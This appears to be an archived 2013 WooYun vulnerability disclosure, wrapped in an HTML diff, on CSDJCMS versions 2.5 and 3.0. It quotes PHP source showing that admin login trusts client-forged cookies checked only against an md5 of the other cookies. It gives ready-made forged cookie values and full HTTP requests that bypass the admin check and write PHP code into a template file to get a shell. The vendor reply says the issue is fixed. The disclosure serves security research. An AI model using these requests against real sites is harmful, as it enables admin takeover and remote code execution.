@@ -1,0 +1,404 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		CSDJCMS拿shell漏洞与PHP源码分析过程  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		CSDJCMS拿shell漏洞与PHP源码分析过程  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/枫叶">枫叶</a> 
+</li><li>提交时间：		2013-04-24 22:21</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-04-24：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-04-24：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-05-04：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-05-14：	细节向普通白帽子公开<br/>
+									2013-05-24：	细节向实习白帽子公开<br/>
+									2013-06-08：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">CSDJCMS漏洞后台拿shell</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail"></p><pre><code>include_once(&quot;include/install.php&quot;);<br />
+if(S_IsInstall==0){<br />
+<br />
+        header(&quot;Location:install/install.php&quot;);<br />
+<br />
+        }<br />
+<br />
+include_once(&quot;include/label.php&quot;);<br />
+<br />
+if(S_Webmode==1 or !file_exists(&quot;index.html&quot;)){<br />
+<br />
+          //缓存区<br />
+<br />
+          $cache_id =&#039;index_&#039;;<br />
+<br />
+          if(!($cache_opt-&gt;start($cache_id))){<br />
+<br />
+                   echo GetTemp(&quot;index.html&quot;,0);        <br />
+<br />
+                  $cache_opt-&gt;end();<br />
+<br />
+          }<br />
+<br />
+        }<br />
+<br />
+else{<br />
+<br />
+        header(&quot;Location:index.html&quot;);<br />
+<br />
+        }<br />
+<br />
+//看他配置吧<br />
+function SafeRequest($key,$mode,$isfilter=&#039;&#039;){<br />
+<br />
+    set_magic_quotes_runtime(0);<br />
+<br />
+    $magic= get_magic_quotes_gpc();<br />
+<br />
+    switch ($mode){<br />
+<br />
+         case &#039;post&#039;:<br />
+<br />
+             $value=isset($_POST[$key]) ?$magic?trim($_POST[$key]):addslashes(trim($_POST[$key])) : &#039;&#039;;<br />
+<br />
+         break;<br />
+<br />
+         case &#039;get&#039;:<br />
+<br />
+             $value=isset($_GET[$key]) ?$magic?trim($_GET[$key]):addslashes(trim($_GET[$key])) : &#039;&#039;;<br />
+<br />
+         break;<br />
+<br />
+         default:<br />
+<br />
+             $value=isset($_POST[$key]) ?$magic?trim($_POST[$key]):addslashes(trim($_POST[$key])) : &#039;&#039;;<br />
+<br />
+             if($value==&quot;&quot;){<br />
+<br />
+                  $value=isset($_GET[$key]) ?$magic?trim($_GET[$key]):addslashes(trim($_GET[$key])) : &#039;&#039;;<br />
+<br />
+             }<br />
+<br />
+         break;<br />
+<br />
+    }<br />
+<br />
+       if($isfilter!=&#039;&#039;){<br />
+<br />
+          $value=lib_replace_end_tag($value);<br />
+<br />
+       }<br />
+<br />
+  return $value;<br />
+<br />
+}<br />
+//变量的提交进行了addslashes安全过滤<br />
+<br />
+//研究了半天的源码发现后台的严重出现了大的安全问题<br />
+include &quot;../include/conn.php&quot;;<br />
+<br />
+include &quot;../include/function.php&quot;;<br />
+<br />
+include &quot;admin_version.php&quot;;<br />
+<br />
+include &quot;admin_loginstate.php&quot;; //问题出在这个文件当中<br />
+<br />
+//跟入<br />
+<br />
+if(empty($_COOKIE[&#039;S_AdminID&#039;])){  //首先看是否存在s_adminid这个cooke<br />
+<br />
+                echo &quot;&lt;script&gt;window.location=&#039;admin_login.php&#039;&lt;/script&gt;&quot;;<br />
+<br />
+                }<br />
+<br />
+        elseif($_COOKIE[&#039;S_Login&#039;]!=md5($_COOKIE[&#039;S_AdminID&#039;].$_COOKIE[&#039;S_AdminUserName&#039;].$_COOKIE[&#039;S_AdminPassWord&#039;].$_COOKIE[&#039;S_Permission&#039;])){   <br />
+<br />
+//这里就是问题的关键之处了<br />
+如果s_login 的值等于 四个cookie 相加的md5加密，即可直接验证通过<br />
+                echo &quot;&lt;script&gt;window.parent.location=&#039;admin_login.php&#039;&lt;/script&gt;&quot;;<br />
+<br />
+                }<br />
+<br />
+//后台权限判断<br />
+<br />
+function SystemPer($Column){<br />
+<br />
+   if(empty($_COOKIE[&#039;S_Permission&#039;])){<br />
+<br />
+        die(&quot;&lt;script&gt;jAlert(&#039;对不起，您无权限操作此功能！&#039;,&#039;操作错误&#039;,function(R){window.location=&#039;javascript:history.go(-1)&#039;;})&lt;/script&gt;&quot;);<br />
+<br />
+   }else{<br />
+<br />
+        $SystemPermission=explode(&quot;,&quot;,$_COOKIE[&#039;S_Permission&#039;]); //权限的判断，用“，”来分割成数组<br />
+<br />
+        $StateOK=0;<br />
+<br />
+        $ArrSystemPermission=count($SystemPermission);<br />
+<br />
+           for($k=0;$k&lt;$ArrSystemPermission;$k++){ <br />
+<br />
+              if($SystemPermission[$k]==$Column){   //判断<br />
+<br />
+                     $StateOK=1;   <br />
+<br />
+              }<br />
+<br />
+           }<br />
+<br />
+       if($StateOK==0){<br />
+<br />
+            die(&quot;&lt;script&gt;jAlert(&#039;对不起，您无权限操作此功能！&#039;,&#039;操作错误&#039;,function(R){window.location=&#039;javascript:history.go(-1)&#039;;})&lt;/script&gt;&quot;);<br />
+<br />
+       } <br />
+<br />
+   }<br />
+<br />
+}<br />
+<br />
+//构造淫荡的cookies<br />
+//S_Permission<br />
+//1,2,3,4,5,6,7,8,9,10,11,12,13,14,15<br />
+//S_Login<br />
+//md5(AdminID+AdminUserName+AdminPassWord+S_Permission)<br />
+//S_AdminUserName<br />
+//1<br />
+//S_AdminPassWord<br />
+//1<br />
+//S_AdminID<br />
+//1<br />
+<br />
+后台成功绕过。<br />
+<br />
+//看看3.0版本，也是一样<br />
+&lt;?php<br />
+# Name: PHP版程氏音乐CMS管理系统 v3.0<br />
+# Author: 程氏&lt;[email]web@chshcms.com[/email]&gt; [QQ:848769359]<br />
+# Homepage:[url]http://www.chshcms.cn/[/url]<br />
+$CS_Path=$_SERVER[&#039;PHP_SELF&#039;];<br />
+$CS_Pathall=explode(&quot;/&quot;,$CS_Path);<br />
+$CS_Admin=$CS_Pathall[1].&quot;/&quot;;<br />
+        if(empty($_COOKIE[&#039;CS_AdminID&#039;])){<br />
+                echo &quot;&lt;script&gt;window.parent.location=&#039;&quot;.CS_WebPath.$CS_Admin.&quot;login.php&#039;;&lt;/script&gt;&quot;;<br />
+                }<br />
+        elseif($_COOKIE[&#039;CS_Login&#039;]!=md5($_COOKIE[&#039;CS_AdminID&#039;].$_COOKIE[&#039;CS_AdminUserName&#039;].$_COOKIE[&#039;CS_AdminPassWord&#039;].$_COOKIE[&#039;CS_Quanx&#039;])){<br />
+                echo &quot;&lt;script&gt;window.parent.location=&#039;&quot;.CS_WebPath.$CS_Admin.&quot;login.php&#039;&lt;/script&gt;&quot;;<br />
+                }<br />
+//后台权限判断<br />
+function SystemPer($Column){<br />
+   if(empty($_COOKIE[&#039;CS_Quanx&#039;])){<br />
+        die(&quot;&lt;script&gt;alert(&#039;对不起，您无权限操作此功能！&#039;);window.location=&#039;javascript:history.go(-1);&#039;&lt;/script&gt;&quot;);<br />
+        exit();<br />
+   }else{<br />
+        $SystemPermission=explode(&quot;,&quot;,$_COOKIE[&#039;CS_Quanx&#039;]);<br />
+        $StateOK=0;<br />
+        $ArrSystemPermission=count($SystemPermission);<br />
+           for($k=0;$k&lt;$ArrSystemPermission;$k++){<br />
+              if($SystemPermission[$k]==$Column){<br />
+                     $StateOK=1;   <br />
+              }<br />
+           }<br />
+       if($StateOK==0){<br />
+            die(&quot;&lt;script&gt;alert(&#039;对不起，您无权限操作此功能！&#039;);window.location=&#039;javascript:history.go(-1);&#039;&lt;/script&gt;&quot;);<br />
+            exit();<br />
+       } <br />
+   }</code></pre><p class='detail'> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">exp V2.5<br />
+<br />
+Host: www.xxx.com<br />
+<br />
+User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:19.0) Gecko/20100101 Firefox/19.0<br />
+<br />
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br />
+<br />
+Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3<br />
+<br />
+Accept-Encoding: gzip, deflate<br />
+<br />
+Referer: http://www.xxx.com/admin/admin_t ... ;file=artindex.html<br />
+<br />
+Cookie: S_Permission=1,2,3,4,5,6,7,8,9,10,11,12,13,14,15; S_Login=d8d998f3eb371c2009acd8580c1821d0; S_AdminUserName=1; S_AdminPassWord=1; S_AdminID=1; CNZZDATA4170884=cnzz_eid%3D1098390420-1364934762-http%253A%252F%252Fwww.hshxs.com%26ntime%3D1364935608%26cnzz_a%3D19%26retime%3D1365111972892%26sin%3Dnone%26ltime%3D1365111972892%26rtime%3D0; bdshare_firstime=1365107576347; PHPSESSID=u6kd9d6f18fhfr9bi4if6agcj6<br />
+<br />
+Connection: keep-alive<br />
+<br />
+Content-Type: application/x-www-form-urlencoded<br />
+<br />
+Content-Length: 169<br />
+<br />
+<br />
+<br />
+FileName=cs-bottom.php&amp;content=%3C%3Fphp+phpinfo+%3F%3E&amp;folder=..%2Fskins%2Findex%2Fhtml%2F&amp;tempname=%C4%AC%C8%CF%C4%A3%B0%E6&amp;Submit=%D0%DE%B8%C4%B5%B1%C7%B0%C4%A3%B0%E5<br />
+<br />
+<br />
+<br />
+--------------------------------------------<br />
+<br />
+<br />
+<br />
+exp V3.0：<br />
+<br />
+Host: www.xxx.com<br />
+<br />
+User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:19.0) Gecko/20100101 Firefox/19.0<br />
+<br />
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br />
+<br />
+Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3<br />
+<br />
+Accept-Encoding: gzip, deflate<br />
+<br />
+Referer: http://www.xxx.com/admin/skins/s ... ;name=cs-bottom.php<br />
+<br />
+Cookie: CS_AdminID=1; CS_AdminUserName=1; CS_AdminPassWord=1; CS_Quanx=0_1,1_1,1_2,1_3,1_4,1_5,2_1,2_2,2_3,2_4,2_5,2_6,2_7,3_1,3_2,3_3,3_4,4_1,4_2,4_3,4_4,4_5,4_6,4_7,5_1,5_2,5_3,5_4,5_5,6_1,6_2,6_3,7_1,7_2,8_1,8_2,8_3,8_4; CS_Login=a3f5f5a662e8a36525f4794856e2d0a2; PHPSESSID=48ogo025b66lkat9jtc8aecub1; CNZZDATA3755283=cnzz_eid%3D1523253931-1364956519-http%253A%252F%252Fwww.djkao.com%26ntime%3D1364956519%26cnzz_a%3D1%26retime%3D1365129491148%26sin%3D%26ltime%3D1365129491148%26rtime%3D0; bdshare_firstime=1365129335963<br />
+<br />
+Connection: keep-alive<br />
+<br />
+Content-Type: application/x-www-form-urlencoded<br />
+<br />
+Content-Length: 57<br />
+<br />
+<br />
+<br />
+name=cs-bottom.php&amp;content=%3C%3Fphp+phpinfo%28%29+%3F%3E </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail"> </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/枫叶" title="枫叶">枫叶</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-022422" title="CSDJCMS拿shell漏洞与PHP源码分析过程">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：5 </p>
+													<p class="detail">确认时间：2013-04-24 22:24</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">谢谢提醒，已经修复！</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="22422";
+var bugRating="-3";
+var myRating="";
+var ratingCount="2";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
